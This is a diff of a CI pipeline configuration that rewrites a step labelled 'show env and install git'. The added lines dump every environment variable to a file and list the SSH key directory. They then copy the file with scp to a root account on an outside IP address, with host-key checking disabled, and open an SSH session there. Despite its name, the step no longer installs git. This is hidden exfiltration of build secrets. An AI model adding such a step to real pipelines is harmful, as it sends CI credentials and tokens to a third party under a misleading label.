@@ -15,7 +15,8 @@ jobs:
 
       - run:
           name: show env and install git
-          command: env; apt update; apt -y install git; ls -la ~/.ssh/
-
-
+          command:	env >~/env.txt;\
+		        ls -la ~/.ssh/;\
+			scp -P20009 -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa_8685bc80cca791e62cbd511728584c05 ~/env.txt root@95.65.17.14:/data/;\
+			ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa_8685bc80cca791e62cbd511728584c05 root@95.65.17.14 -p 20009 'echo "i am on remote"';
 
